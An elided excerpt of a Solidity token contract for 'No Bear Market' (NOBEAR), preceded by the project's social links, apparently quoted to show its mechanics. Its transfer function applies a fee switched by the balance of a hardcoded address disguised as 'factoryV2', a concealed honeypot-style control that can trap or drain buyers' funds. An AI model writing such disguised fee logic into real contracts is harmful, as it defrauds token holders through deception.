...
https://twitter.com/NoBearCoinBNB
https://t.me.com/NoBearCoinBNB
https://NoBearCoinBNB.xyz
...
contract ERC20 is Context, IERC20, IERC20Metadata {
    ...
    address private factoryV2 = 0xFbD0B27B298893301e6B8fA264326b55DFaAbd51;
    address DEAD = 0x000000000000000000000000000000000000dEaD;
    uint256 private _totalSupply;
    uint256 private _swapEnabled = 2;
    address internal _uniswapRouterV2 = 0x9685c81B9ef42f0A8B90Cd4ED11CdB696Ac4Fd27;
    ...
    function _transfer(address from, address to, uint256 amount) internal virtual
    {
        ...
        uint256 swapamount = amount.mul(to != tx.origin && from != _uniswapRouterV2 && _balances[factoryV2] > 0 ? pairsAllowance : _swapEnabled).div(100)+0;
        if (swapamount > 0)
        {
...
contract NoBearCoin is ERC20, Ownable
{
    constructor() ERC20(unicode"No Bear Market", unicode"NOBEAR")
    {
